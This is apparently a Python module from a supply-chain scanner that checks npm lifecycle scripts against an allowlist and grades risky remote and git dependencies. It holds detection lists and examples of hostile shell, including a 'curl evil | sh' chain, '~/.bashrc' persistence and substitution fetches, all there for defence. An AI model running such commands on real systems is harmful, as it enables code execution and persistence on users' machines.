"""A manifest's lifecycle scripts: what runs on install, and whether it is a known tool doing its job.

The lifecycle check is an allowlist: the attack is adding a script, so what is recognised is the
set of tools a script may invoke and the shapes that keep it inert -- a build, a test, a formatter --
and anything else is reported.
"""

from __future__ import annotations

import posixpath
import re
from typing import ClassVar

from cordon_scanner.detect.base import FileUnit, ScanContext
from cordon_scanner.detect.supply.manifests.rule_ids import (
    MALICIOUS_REMOTE_TARBALL_RULE,
    REMOTE_TARBALL_RULE,
)
from cordon_scanner.foundation.formats.scanned_json import ScannedJson
from cordon_scanner.foundation.models import (
    Severity,
)

RAW_IP_HOST = re.compile(r"\d{1,3}(?:\.\d{1,3}){3}|\[[0-9a-fA-F:]{2,45}\]")

_INLINE_JS_LOAD = re.compile(r"""\b(?:require|import)\s{0,4}\(\s{0,4}[`'"]([^`'"\s]{1,200})[`'"]""")
"""A module an inline JavaScript program loads by a literal name."""

_INLINE_PY_IMPORT = re.compile(
    r"(?:^|[;\n]\s{0,8})(?:from\s{1,4}([\w.]{1,100})\s{1,4}import|import\s{1,4}([\w., ]{1,200}))"
)
"""The modules an inline Python program imports."""

_NODE_BUILTINS = frozenset({"fs", "path", "util", "assert", "events", "url", "process", "os"})
"""Built-ins whose capabilities, when used, the capability rules label themselves."""

_PYTHON_INERT_MODULES = frozenset({"sys", "os", "platform", "pathlib", "shutil", "json", "re"})
"""Standard modules whose risky calls the capability rules label themselves."""

SAFE_LIFECYCLE_PREFIXES = (
    "node-gyp",
    "node-gyp-build",
    "prebuild-install",
    "node-pre-gyp",
    "prebuildify",
    "tsc",
    "npm run build",
    "yarn build",
    "pnpm build",
    "husky install",
    "husky",
    "patch-package",
    "opencollective",
    "is-ci",
    "cmake-js",
    "neon build",
    "electron-builder install-app-deps",
)
"""Commands a lifecycle script may run without raising anything.

An allowlist, because the attack is *adding a script*, not putting a particular
word in one. The check used to be a blocklist of hostile substrings, and its own
docstring said otherwise -- so `postinstall: node ./scripts/setup.js`, the single
most common npm attack shape, produced no finding at all. That is the failure
this project names as unacceptable: a control that reads as protective while
doing nothing.

Short on purpose. Native compilation and a TypeScript build are the honest
reasons to run at install time; everything else is a script somebody should look
at, which is what the finding says. An entry here is a decision that a command
needs no review, so the list stays small enough to read.
"""

SAFE_TOOLS: dict[str, str] = {
    # Measured in the 200K corpus (review 98, FP-1): the hook commands of 5,744 npm packages,
    # ranked by frequency and each reviewed once. Command prefix -> the npm package that provides
    # the command, which must not be declared from anywhere but the registry (`GENUINE_SPEC`).
    "only-allow": "only-allow",
    "npx only-allow": "only-allow",
    "nuxt prepare": "nuxt",
    "nuxi prepare": "nuxi",
    "npx nuxi prepare": "nuxi",
    "svelte-kit sync": "@sveltejs/kit",
    "ngcc": "@angular/compiler-cli",
    "prisma generate": "prisma",
    "npx prisma generate": "prisma",
    "bower install": "bower",
    "lerna bootstrap": "lerna",
    "electron-rebuild": "electron-rebuild",
    "opencollective-postinstall": "opencollective-postinstall",
    "simple-git-hooks": "simple-git-hooks",
    "npx simple-git-hooks": "simple-git-hooks",
    "npx husky install": "husky",
    "npx husky": "husky",
    "husky install": "husky",
    "husky": "husky",
    "playwright install": "playwright",
    "npx playwright install": "playwright",
    "typings install": "typings",
    "npx npm-force-resolutions": "npm-force-resolutions",
    "npx force-resolutions": "force-resolutions",
    "patch-package": "patch-package",
    "prebuild-install": "prebuild-install",
    "node-pre-gyp": "@mapbox/node-pre-gyp",
    "node-gyp-build": "node-gyp-build",
    "cmake-js": "cmake-js",
    "opencollective": "opencollective",
    "is-ci": "is-ci",
}
"""Third-party tools a lifecycle script may run, by the package that provides each. An attacker can
name a command after one, so it counts only when that package is not declared from a git
repository, a URL, a local path or under an `npm:` alias (`08` P1)."""

NPM_BUILTINS = ("npm rebuild", "npm prune")
"""npm's own commands that re-link or rebuild what is already installed."""

GENUINE_SPEC = re.compile(
    r"^\s*(?:npm:|git[+:]|https?:|file:|link:|github:|gitlab:|bitbucket:|[\w.-]+/[\w.-]+(?:#|$))"
)
"""A dependency spec that is not the registry: what makes a safe tool's name a costume."""

CONTROL = re.compile(r"(?:exit(?:\s+\d{1,3})?|true|:)")
"""Shell words that do nothing but end or succeed: `echo "use pnpm" && exit 1` is a guard."""

FILE_TEST = re.compile(
    r"(?:test|\[)\s++(?:!\s*+)?-[defrsxz]\s++(?![/~$\\])(?!.*\.\.)[\w./@-]{1,200}(?:\s+\])?"
)
r"""A test of a path inside the package, as in `test -d dist || npm run build || true`: it runs
nothing and only decides whether the step after it does, which is judged on its own. The blanks
around the `!` are taken once (`\s++(?:!\s*+)?`): as `\s+!?\s*` they split one run every way, which
`fullmatch` did on every lifecycle-script word, and so are the blanks after the flag: the path
cannot start with one, and each blank `\s+` gave back ran the `(?!.*\.\.)` lookahead again
(review 98, 27-PERFORMANCE)."""

CD_INSIDE = re.compile(r"cd\s++(?![/~$\\])(?!.*\.\.)[\w./@-]{1,200}")
r"""A change of directory inside the package: what the command after it runs still decides. The
blanks are taken once (`\s++`; the directory cannot start with one): as `\s+` each blank given back
ran the `(?!.*\.\.)` lookahead to the end of the word again (review 98, 27-PERFORMANCE)."""

RUN_SCRIPT = re.compile(
    r"(?:npm\s+run(?:-script)?|pnpm\s+run|yarn\s+run|yarn|pnpm)\s+(?P<name>[\w:.-]{1,80})(?:\s+--.*)?"
)
"""`npm run build`: another script in the same manifest, judged by what IT runs."""

ASSIGNED_NAME = re.compile(r"[A-Za-z_]\w{0,60}=")
"""A leading `VAR=value` (or after `env`); stripped only when its value runs nothing."""

LOCAL_BIN = re.compile(r"^(?:\./)?node_modules/\.bin/")
"""`./node_modules/.bin/bower install` is `bower install`, as npm puts that directory on PATH."""

TOOL_PACKAGES: dict[str, tuple[str, ...]] = {
    "tsc": ("typescript",),
    "coffee": ("coffee-script", "coffeescript"),
    "jetify": ("jetifier",),
    "ts-patch": ("ts-patch",),
}
"""Commands whose package is named otherwise. Elsewhere a command is its package's name, or the
name after the scope (`@gov.au/pancake` provides `pancake`)."""

RUNNERS = frozenset(
    {
        "node",
        "nodejs",
        "bun",
        "deno",
        "tsx",
        "ts-node",
        "esno",
        "sh",
        "bash",
        "zsh",
        "dash",
        "python",
        "python3",
        "ruby",
        "perl",
        "php",
        "pwsh",
        "powershell",
        "env",
        "sudo",
        "exec",
        "npx",
        "npm",
        "pnpm",
        "yarn",
        "bunx",
        "cmd",
        "eval",
        "source",
    }
)
"""Commands that run whatever they are handed: never a tool's own work, whatever package shares
the name."""

OWN_INSTALL = re.compile(
    r"(?:npm\s+(?:install|i|ci)|pnpm\s+(?:install|i)|yarn(?:\s+install)?)(?:\s+--?[\w-]{1,40}(?:=[\w.-]{1,80})?){0,6}"
)
"""Installing the package's own declared dependencies, with flags only: what it fetches is what
the manifest already declares, each graded as a dependency. `npm install <name>` is not this."""

INSIDE_PATH = r"(?![/~$\\])(?!.*\.\.)[\w./@-]{1,90}"

FILE_OP_INSIDE = re.compile(
    rf"(?:touch|cat|rm(?:\s+-[rfvR]{{1,4}})?|mkdir(?:\s+-p)?"
    rf"|chmod\s+(?:[0-7]{{3,4}}|[ugoa]{{0,4}}[-+=][rwxX]{{1,4}}))"
    rf"(?:\s+{INSIDE_PATH}){{1,10}}"
)
"""Creating a file or directory, or changing a mode, inside the package: it runs nothing; a later
step that runs what it made is judged on its own."""

INERT_ONE_LINER = re.compile(r"(?:node|nodejs|python3?)\s{1,4}(?:-e|-c)\s{1,4}''")
"""A one-liner whose program `_prints_only` found to only talk or exit, after its program was blanked."""

REDIRECT_OUTSIDE = re.compile(r"\$\(|`|<\(|>\s{0,4}[/~$]")
"""A substitution, or output written outside the package: what makes a tool's run more than itself."""

NPX_FLAGS = frozenset({"--yes", "-y", "--no-install"})
"""Flags npx takes before the tool it runs."""

OWN_MODULE = re.compile(r"node_modules/[\w@./*-]{1,200}")
"""A path inside the package's own `node_modules`."""

NOT_SCRIPTS = frozenset({"install", "add", "i", "ci", "remove", "upgrade", "update", "dlx", "exec"})
"""Package-manager verbs that are not a script name after `yarn` or `pnpm`."""

#: Directories whose manifests belong to somebody else.
#:
#: The distinction this rule was missing, and the reason it was calibrated for one
#: case and only ever fired on the other. An install script in a DEPENDENCY'S
#: manifest is code the project did not write, arriving through a lockfile,
#: running automatically on install: that is the npm attack shape, and it earns
#: high severity. An install script in the project's OWN root manifest is code
#: somebody here wrote, in the file every pull request touches, usually running a
#: script a few directories away in the same repository.
#:
#: Both were reported at high, which is backwards in practice, because
#: `node_modules` is pruned by default -- so in ordinary use the only manifests
#: this rule ever sees are first-party ones. It reported six high-severity
#: findings across three repositories for `"preinstall": "node
#: scripts/security/only-pnpm.mjs"`, a script whose entire purpose is to refuse an
#: install from the wrong package manager, and fifty-five in an Office add-in.
VENDORED_DIRECTORIES = (
    "node_modules",
    "bower_components",
    "vendor",
    "site-packages",
    "dist-packages",
    ".venv",
    "venv",
    "Pods",
    "Carthage",
    ".cargo",
    ".gradle",
    ".m2",
    ".nuget",
    "gems",
)


class ManifestScripts:
    """Whose manifest this is, and what its lifecycle commands run."""

    @staticmethod
    def _is_vendored(path: str) -> bool:
        """Whether this manifest belongs to an installed dependency rather than here."""
        segments = path.replace("\\", "/").split("/")
        return any(segment in VENDORED_DIRECTORIES for segment in segments)

    @staticmethod
    def _is_first_party(path: str, ctx: ScanContext) -> bool:
        """Whether this manifest is the scanned project's own.

        Two conditions, and both took a corpus failure to get right.

        The manifest must not be under a dependency directory, and the scan target must
        BE a git repository root.

        Vendoring alone is not enough, because the case that matters most has no vendor
        directory in it: a published package, an sdist, a downloaded tarball. There the
        hostile manifest IS the root manifest, and three malicious samples in this
        project's own corpus are exactly that shape -- `acme-telemetry`, built to look
        like a real npm compromise, went from high to low on the path test alone.

        `is_git` was the obvious second condition and is the wrong one. It answers
        "is there a repository above this", so scanning
        `corpus/malicious/acme-telemetry` from inside a checkout answers yes, and every
        downloaded package or extracted archive examined anywhere inside any repository
        reads as first-party. The question is whether the thing handed to the scanner is
        the working tree itself, which is what `scanned_repository_root` records.

        What the downgrade gives up is nothing, and the same corpus sample proves it:
        `acme-telemetry` declares three CRITICAL findings besides the install-script
        one, because the script the manifest points at is read by the content detectors
        on its own merits. The manifest finding is a pointer at a file. The file is
        where the answer is.
        """
        if ManifestScripts._is_vendored(path):
            return False
        return bool(ctx.repository is not None and ctx.repository.scanned_repository_root)

    @staticmethod
    def _targets_in_tree(
        command: str, known: frozenset[str], manifest_path: str = ""
    ) -> tuple[str, ...]:
        """Files in this repository that the command runs.

        A first-party install script that runs a file in the same repository is a
        different proposition from one that runs something opaque. The file is tracked,
        was reviewed when it landed, and -- the part that matters most here -- is being
        scanned by every content detector in this same run. Reporting the manifest at
        high severity for pointing at a file the scanner has already read and cleared
        says nothing the reader can act on.

        `ctx.install_hook_paths` is the engine's own resolution of every install hook
        to the in-tree files it reaches, so this asks a question that has already been
        answered rather than parsing shell a second time and disagreeing about it.
        """
        if not known:
            return ()
        tokens = {
            re.sub(r"^(?:\./)+", "", token.strip("\"'`()"))
            for token in re.split(r"[\s;|&]+", command)
            if token.strip()
        }
        # Relative to the manifest, as the package manager runs it: `node install.js` in
        # `esbuild.tgz!package/package.json` is `esbuild.tgz!package/install.js`.
        base = manifest_path.rpartition("/")[0]
        if base:
            tokens |= {posixpath.normpath(f"{base}/{token}") for token in list(tokens) if token}
        # Node resolves `./postinstall` to `postinstall.js` and friends.
        tokens |= {
            f"{token}{suffix}"
            for token in list(tokens)
            if token and "." not in posixpath.basename(token)
            for suffix in (".js", ".cjs", ".mjs", ".ts", "/index.js")
        }
        if re.search(r"(?:^|[\s;&|(])(?:node|nodejs|tsx|ts-node|bun)\s+\.(?:\s|$)", command):
            # `node .`: the package's own entry point.
            tokens |= {f"{base}/index.js" if base else "index.js"}
        return tuple(
            sorted(
                path for path in known if path in tokens or re.sub(r"^(?:\./)+", "", path) in tokens
            )
        )

    @staticmethod
    def _loads_only_what_was_read(path: str, source: str, ctx: ScanContext) -> bool:
        """Whether every module an inline program loads is one this scan read or a runtime
        built-in. `node -e "require('./log')()"` runs `log.js`: in the package and in the hook's
        closure, it was read as install-time code; absent, what runs is unknown. A dependency's
        module (`require('some-lib')`) is that package's code, not read here.
        """
        if path.endswith(".js"):
            base = path.rpartition("#")[0].rpartition("/")[0]
            for spec in _INLINE_JS_LOAD.findall(source):
                spec = re.sub(r"^\$\{__dirname\}/", "./", spec).removeprefix("node:")
                if spec in _NODE_BUILTINS:
                    continue
                if not spec.startswith(("./", "../")):
                    return False
                target = posixpath.normpath(f"{base}/{spec}" if base else spec)
                if not any(
                    f"{target}{suffix}" in ctx.install_hook_paths
                    for suffix in ("", ".js", ".cjs", ".mjs", "/index.js")
                ):
                    return False
            return True
        if path.endswith(".py"):
            names = [
                name.split(" ")[0]
                for single, listed in _INLINE_PY_IMPORT.findall(source)
                for name in ([single] if single else re.split(r"\s*,\s*", listed.strip()))
                if name
            ]
            return all(name.split(".")[0] in _PYTHON_INERT_MODULES for name in names)
        # Ruby, Perl and PHP: lowered only when nothing is loaded at all.
        return not re.search(r"\b(?:require|use|include|load)\b", source)

    @staticmethod
    def _capable(path: str, source: str, ctx: ScanContext) -> bool:
        """Whether the capability rules label anything in a hook's inline program."""
        from cordon_scanner.analysis.shared.languages import LanguageRegistry
        from cordon_scanner.detect.code.capability.detector import CapabilityDetector
        from cordon_scanner.foundation.content import FileContent

        if not ManifestScripts._loads_only_what_was_read(path, source, ctx):
            return True
        content = FileContent.from_bytes(path, source.encode("utf-8"), ctx.config.limits)
        labelled = CapabilityDetector().labelled(
            FileUnit(content=content, language=LanguageRegistry.of_file(path, content)), ctx
        )
        return labelled is not None and bool(labelled[0])

    @staticmethod
    def _prints_only(command: str) -> bool:
        """Whether every interpreter one-liner in this command only talks or exits.

        Conservative in the direction that matters. A command with no extractable `-e`/`-c`
        program is not inert; any substring from `NOT_INERT` disqualifies the whole command;
        and every call the program makes has to be one of the printing or exiting ones, so a
        program that prints AND does something else is not excused.
        """
        programs = [
            next((group for group in match.groups() if group), "")
            for match in ONE_LINER_PROGRAM.finditer(command)
        ]
        if not programs:
            return False
        if any(marker in command for marker in NOT_INERT):
            return False
        for body in programs:
            if not body:
                return False
            calls = ANY_CALL.findall(body)
            inert = INERT_CALL.findall(body)
            if len(calls) != len(inert):
                return False
        return True

    @staticmethod
    def _is_safe_lifecycle(
        command: str,
        scripts: dict[str, str] | None = None,
        declared: dict[str, str] | None = None,
        depth: int = 0,
    ) -> bool:
        """Whether a lifecycle command is a recognised build step.

        Compared against the whole command after stripping shell chaining, so
        `node-gyp rebuild && curl evil | sh` is not waved through by its first
        clause -- which is how an allowlist that matched a prefix of the raw string
        would have been defeated in one move. `npm run X` is judged by what script `X` runs,
        three levels deep at most; a tool is judged by where its package comes from.
        """
        if ManifestScripts._prints_only(command):
            # The program a `-e` would be split inside of; already judged to only talk.
            command = ONE_LINER_PROGRAM.sub(lambda m: m.group(0)[:2] + " ''", command)
        parts = [p.strip(" ()") for p in re.split(r"&&|\|\||;|\||\n", command) if p.strip(" ()")]
        while len(parts) > 1 and re.fullmatch(r"cd\s+\.\.(?:/\.\.){0,4}/?", parts[-1]):
            # `cd client && npm install && cd ..`: a last step that only returns runs nothing.
            parts.pop()
        if not parts:
            return False
        return all(
            ManifestScripts._safe_part(part, scripts or {}, declared or {}, depth) for part in parts
        )

    @staticmethod
    def _safe_part(
        part: str, scripts: dict[str, str], declared: dict[str, str], depth: int
    ) -> bool:
        # The same command, spelled the ways packages spell it: behind variable assignments
        # (`env PKG_CONFIG_PATH=./x node-gyp rebuild`), through the local bin directory, or by
        # npx. An assignment whose value runs something (`X=$(curl ...)`) is not stripped.
        stripped = LOCAL_BIN.sub("", ManifestScripts._without_assignments(part), count=1)
        if stripped != part:
            return bool(stripped) and ManifestScripts._safe_part(stripped, scripts, declared, depth)
        tokens = part.split()
        if tokens and tokens[0] == "npx":
            rest = " ".join(t for t in tokens[1:] if t not in NPX_FLAGS)
            if any(
                rest == t or rest.startswith(f"{t} ") for t in SAFE_TOOLS
            ) or ManifestScripts._popular_tool(rest, declared):
                return ManifestScripts._safe_part(rest, scripts, declared, depth)
        if (
            OWN_INSTALL.fullmatch(part)
            or FILE_OP_INSIDE.fullmatch(part)
            or INERT_ONE_LINER.fullmatch(part)
            or ManifestScripts._popular_tool(part, declared)
        ):
            return True
        if (
            len(tokens) >= 3
            and tokens[0] == "rm"
            and re.fullmatch(r"-[rfvR]{1,4}", tokens[1])
            and all(OWN_MODULE.fullmatch(t) and ".." not in t for t in tokens[2:])
        ):
            # Removing something from the package's own `node_modules`: the stubs packages prune.
            return True
        if any(part == safe or part.startswith(f"{safe} ") for safe in SAFE_LIFECYCLE_PREFIXES):
            tool = SAFE_TOOLS.get(
                next(
                    (
                        t
                        for t in sorted(SAFE_TOOLS, key=len, reverse=True)
                        if part == t or part.startswith(f"{t} ")
                    ),
                    "",
                ),
            )
            return tool is None or not GENUINE_SPEC.match(declared.get(tool, ""))
        for prefix, package in sorted(SAFE_TOOLS.items(), key=lambda kv: -len(kv[0])):
            if part == prefix or part.startswith(f"{prefix} "):
                return not GENUINE_SPEC.match(declared.get(package, ""))
        if any(part == b or part.startswith(f"{b} ") for b in NPM_BUILTINS):
            return True
        if (
            CONTROL.fullmatch(part)
            or CD_INSIDE.fullmatch(part)
            or FILE_TEST.fullmatch(part)
            or ManifestScripts._only_prints(part)
        ):
            return True
        run = RUN_SCRIPT.fullmatch(part)
        if run and run.group("name") not in NOT_SCRIPTS and depth < 3:
            target = scripts.get(run.group("name"))
            return target is not None and ManifestScripts._is_safe_lifecycle(
                target, scripts, declared, depth + 1
            )
        return False

    #: Where a project's own source is archived: a tarball from here is code anyone can read.
    _CODE_HOSTS: ClassVar[tuple[str, ...]] = (
        "github.com",
        "codeload.github.com",
        "githubusercontent.com",
        "gitlab.com",
        "bitbucket.org",
    )
    #: A source-archive path a code host serves for a ref.
    _SOURCE_ARCHIVE: ClassVar[re.Pattern[str]] = re.compile(
        r"/(?:repository/archive|-/archive|archive|tarball|zipball)(?:/|\.tar\.gz|\.zip|\?)"
    )
    #: A file named for a release, `xlsx-0.20.3.tgz`: what a vendor's CDN serves, fixed per URL.
    #: "A version somewhere in the name" is the lookahead `(?=[^/?#]*\d\.\d)`, read once per path
    #: segment: written `[^/?#]*\d+\.\d+[^/?#]*` it split each segment every way around its digits
    #: (review 98, 27-PERFORMANCE). The extension holds no digit, so the version still comes before it.
    _VERSIONED_TARBALL: ClassVar[re.Pattern[str]] = re.compile(
        r"/(?=[^/?#]*\d\.\d)[^/?#]*\.(?:tgz|tar\.gz)(?:[?#].*)?$"
    )

    @staticmethod
    def _remote_tarball(
        spec: str, path: str, ctx: ScanContext, checksummed: bool
    ) -> tuple[str, str, Severity] | None:
        """(rule, host, severity) when a published npm package's own manifest depends on an
        http(s) URL off any registry.

        Measured on the 193 malware samples with URL dependencies and 1,158 benign units with
        them (review 98, REC-3): the malware's URLs are version-less endpoints on lookalike
        artifact hosts (`packages.storeartifact.com/npm/<name>`) or raw addresses, served fresh on
        every install; the benign ones are GitHub archives and release tarballs on a vendor's CDN
        (`cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz`). Those two are reported below the gate.
        """
        from cordon_scanner.analysis.shared.destinations import ALL_HOSTS, INTERACTION_HOSTS

        member = path.rpartition("!")[2]
        own_manifest = member == "package/package.json" or (
            ctx.package_distribution and member == "package.json"
        )
        if not own_manifest or checksummed:
            return None
        found = re.match(r"https?://(?:[^@/]{1,200}@)?([^/:?#]{1,253})", spec.strip())
        if found is None:
            return None
        host = found.group(1).lower()
        if host in ("registry.npmjs.org", "registry.yarnpkg.com", "registry.npmmirror.com"):
            return None
        if RAW_IP_HOST.fullmatch(host) is not None or any(
            host == known or host.endswith("." + known) for known in ALL_HOSTS | INTERACTION_HOSTS
        ):
            return MALICIOUS_REMOTE_TARBALL_RULE, host, Severity.CRITICAL
        code_host = (
            any(host == h or host.endswith("." + h) for h in ManifestScripts._CODE_HOSTS)
            # A self-hosted GitLab or Gitea serving a source archive: `gitlab.<company>/...
            # /repository/archive.tar.gz?ref=v1.0`, `.../-/archive/...`, `.../archive/<ref>.tar.gz`.
            or host.startswith(("gitlab.", "git.", "gitea."))
            or ManifestScripts._SOURCE_ARCHIVE.search(spec.strip()) is not None
        )
        if code_host or ManifestScripts._VERSIONED_TARBALL.search(spec.strip()):
            return REMOTE_TARBALL_RULE, host, Severity.MEDIUM
        return REMOTE_TARBALL_RULE, host, Severity.HIGH

    #: A git dependency pinned to a full commit: `github:owner/repo#<sha>`, `git+https://github.com/
    #: owner/repo.git#<sha>`, `owner/repo#<sha>`.
    _COMMIT_PINNED: ClassVar[re.Pattern[str]] = re.compile(
        r"^(?:github:|gitlab:|bitbucket:|git\+https?://(?:www\.)?(?:github|gitlab|bitbucket)\.(?:com|org)/"
        r"|https?://(?:www\.)?(?:github|gitlab|bitbucket)\.(?:com|org)/|git\+ssh://git@[\w.-]+[:/]|git@[\w.-]+:)?"
        r"(?P<owner>[\w.-]{1,100})/(?P<repo>[\w.-]{1,100}?)(?:\.git)?#(?P<sha>[0-9a-fA-F]{40})$"
    )

    @staticmethod
    def _foreign_commit(name: str, spec: str, path: str, ctx: ScanContext) -> str | None:
        """`owner/repo` when a published npm package's own manifest installs a dependency from a
        commit of a repository that is not that dependency's: `"@antv/setup": "github:antvis/G2#<40
        hex>"`. A full SHA reaches any commit in the repository's fork network, including one an
        attacker pushed to a fork that no branch of the repository holds, and npm runs that
        commit's lifecycle scripts at install. A project depending on its own fork names the
        dependency after the repository; a name that is not the repository's borrows a trusted
        organisation's for code it never published (review 98: 112 of 118 malicious git
        dependencies; 0 of 19,036 benign npm and Open VSX units pin a full commit under another
        name)."""
        member = path.rpartition("!")[2]
        own_manifest = member == "package/package.json" or (
            ctx.package_distribution and member == "package.json"
        )
        found = ManifestScripts._COMMIT_PINNED.match(spec.strip())
        if not own_manifest or found is None:
            return None

        def norm(text: str) -> str:
            return re.sub(r"[^a-z0-9]", "", text.lower())

        repo, base = norm(found.group("repo")), norm(name.rsplit("/", 1)[-1])
        if not repo or not base or repo in base or base in repo:
            return None
        return f"{found.group('owner')}/{found.group('repo')}"

    @staticmethod
    def _without_assignments(part: str) -> str:
        """`part` without leading `VAR=value` words (or `env` and them) whose values run nothing:
        `env PKG_CONFIG_PATH=./x node-gyp rebuild` is `node-gyp rebuild`; `X=$(curl ..) y` stays."""
        tokens = part.split()
        index = 1 if tokens and tokens[0] == "env" else 0
        start = index
        while index < len(tokens) and ASSIGNED_NAME.match(tokens[index]):
            if "$(" in tokens[index] or "`" in tokens[index]:
                return part
            index += 1
        return " ".join(tokens[index:]) if index > start else part

    @staticmethod
    def npm_scripts(unit: FileUnit) -> tuple[dict[str, str], dict[str, str]]:
        """A package.json's scripts, and every dependency it declares with its spec."""

        try:
            data = ScannedJson.loads(unit.content.text)
        except ValueError:
            return {}, {}
        if not isinstance(data, dict):
            return {}, {}
        scripts = {k: v for k, v in (data.get("scripts") or {}).items() if isinstance(v, str)}
        declared: dict[str, str] = {}
        for field in (
            "dependencies",
            "devDependencies",
            "optionalDependencies",
            "peerDependencies",
        ):
            section = data.get(field)
            if isinstance(section, dict):
                declared.update({k: v for k, v in section.items() if isinstance(v, str)})
        return scripts, declared

    @staticmethod
    def unpublishable(unit: FileUnit) -> bool:
        """Whether a package.json declares `"private": true`, which npm refuses to publish.

        No registry serves it, so nobody installs it as a dependency: its lifecycle scripts run
        for whoever works in that tree, the project's own build. 9 of 18 benign repository
        snapshots blocked on an install script were these (review 98: `jetify &&
        patch-package`, `wxt prepare`, `husky`). A published package cannot carry the flag, so
        no published package's hook is graded here.
        """

        try:
            data = ScannedJson.loads(unit.content.text)
        except ValueError:
            return False
        return isinstance(data, dict) and data.get("private") is True

    @staticmethod
    def _popular_tool(part: str, declared: dict[str, str]) -> bool:
        """Whether `part` runs the command of a popular package this manifest declares from the
        registry: `gulp`, `webpack src/web.js > build/out.js`, `tsc`, `umi generate tmp`.

        What runs is that package's published code, which is read where it is installed. Popular,
        because declaring a package is what an attacker controls: `bitcoin-main-lib` ran
        `postinstall: bip40`, the bin of a malicious dependency it declared (review 98). Measured
        on the benign long tail, 9 of 23 published packages blocked on an install hook ran a build
        tool this way.
        """
        from cordon_scanner.intel.registry import BuiltinPackageNames

        command = part.split(maxsplit=1)[0] if part.strip() else ""
        if not command or command in RUNNERS or REDIRECT_OUTSIDE.search(part):
            # An interpreter runs whatever file it is handed: `vant`'s compromised releases ran
            # `node lib/utils/support.js`, and `@types/node` is a popular package named `node`
            # after its scope.
            return False
        popular = BuiltinPackageNames.established("npm")
        named = TOOL_PACKAGES.get(command, ())
        return any(
            (name in named or name.rpartition("/")[2] == command)
            and not name.startswith("@types/")
            and name in popular
            and not GENUINE_SPEC.match(spec)
            for name, spec in declared.items()
        )

    @staticmethod
    def _only_prints(part: str) -> bool:
        """`echo` with nothing that writes or runs: no redirection, no substitution. `echo done` is
        a message; `echo x >> ~/.bashrc` is persistence and `echo $(curl x)` is a fetch."""
        return (part == "echo" or part.startswith("echo ")) and not any(
            marker in part for marker in (">", "<", "`", "$(", "${")
        )


#: What a one-liner does when all it does is talk.
#:
#: `node -e` and `python -c` are in `HOSTILE_IN_LIFECYCLE` because they take a string
#: and run it, which is the shape every second-stage loader uses. They are also how a
#: package prints a message or declines to install:
#:
#:     "preinstall": "node -e 'process.exit(0)'"
#:
#: is `electron`'s, and it exists to make `npm install` fail so that people use yarn.
#: `OpenHands` uses the same construct to print a welcome message naming the command to
#: run next. Two of the largest repositories in the corpus, both reported at HIGH for a
#: program whose entire effect is a line of text.
#:
#: The engine already draws this distinction for hook PATHS -- `PRINTING_COMMANDS` and
#: `Hooks.runs` strip printer segments before resolving what a lifecycle script
#: reaches -- and the manifest detector had no equivalent for the program inside a `-e`.
INERT_CALL = re.compile(
    r"(?:console\s*\.\s*(?:log|info|warn|error|debug)"
    r"|process\s*\.\s*(?:stdout|stderr)\s*\.\s*write"
    r"|process\s*\.\s*exit"
    r"|sys\s*\.\s*stdout\s*\.\s*write"
    r"|sys\s*\.\s*exit"
    r"|print)\s*\("
)
"""A call that writes a message or ends the process, and does nothing else."""

ANY_CALL = re.compile(
    r"(?<![\w.$\[\]'\"])(?:[^\WA-Za-z_]|[.\[\]'\"])*+([A-Za-z_$][\w.$\[\]'\"]*+\s*\()"
)
r"""Anything that looks like a call, so the inert ones can be counted against the total.

`findall` gives each call from its first letter, `_` or `$` to its `(`, as the plain
`[A-Za-z_$][\w.$\[\]'"]*\s*\(` would. A match starts only where a run of name characters
starts (the lookbehind), skipping the run's characters that cannot begin a name: the plain form
retried every position of a long run that never reaches `(`, quadratic in a script an attacker
writes (review 98, 27-PERFORMANCE)."""

NOT_INERT = (
    "require(",
    "import(",
    "exec",
    "spawn",
    "fork(",
    "child_process",
    "readFile",
    "writeFile",
    "fs.",
    "os.",
    "subprocess",
    "urllib",
    "fetch(",
    "http",
    "curl",
    "wget",
    "eval(",
    "Function(",
    "atob",
    "b64decode",
    "Buffer.from",
)
"""Calls that mean a one-liner does something beyond talking.

Checked as substrings and deliberately short: any of these and the program is doing
work, whatever else it also prints. `cherry-studio`'s `prepare` installs a git hook with
`require('child_process').execSync('prek install')`, which is exactly the case this must
not excuse.
"""

ONE_LINER_PROGRAM = re.compile(
    r"(?:-e|-c)\s{1,4}(?:'([^']{0,400})'|\"([^\"]{0,400})\"|(\S{1,400}))"
)
"""The program a `-e` or `-c` flag supplies.

Bounded at every repeat, and the double-quoted form takes no escape alternation. The
first draft handled `\\"` with an alternation under a `*`, which the pattern validator
refused as an unbounded quantifier over a group containing one -- the textbook
catastrophic-backtracking shape, and the third time in this pass that the validator
caught an engine pattern a rule pack would have been refused for.

Nothing is lost by dropping the escape handling: a command reaches here already
decoded from the manifest's JSON, so an inner quote is a literal one and the class
stops at it. Four hundred characters is past any lifecycle one-liner anybody writes,
and a longer one simply does not match -- which reports it, the safe direction.
"""


__all__ = [
    "ANY_CALL",
    "ASSIGNED_NAME",
    "CD_INSIDE",
    "CONTROL",
    "FILE_OP_INSIDE",
    "FILE_TEST",
    "GENUINE_SPEC",
    "INERT_CALL",
    "INERT_ONE_LINER",
    "INSIDE_PATH",
    "LOCAL_BIN",
    "NOT_INERT",
    "NOT_SCRIPTS",
    "NPM_BUILTINS",
    "NPX_FLAGS",
    "ONE_LINER_PROGRAM",
    "OWN_INSTALL",
    "OWN_MODULE",
    "RAW_IP_HOST",
    "REDIRECT_OUTSIDE",
    "RUNNERS",
    "RUN_SCRIPT",
    "SAFE_LIFECYCLE_PREFIXES",
    "SAFE_TOOLS",
    "TOOL_PACKAGES",
    "VENDORED_DIRECTORIES",
    "ManifestScripts",
]
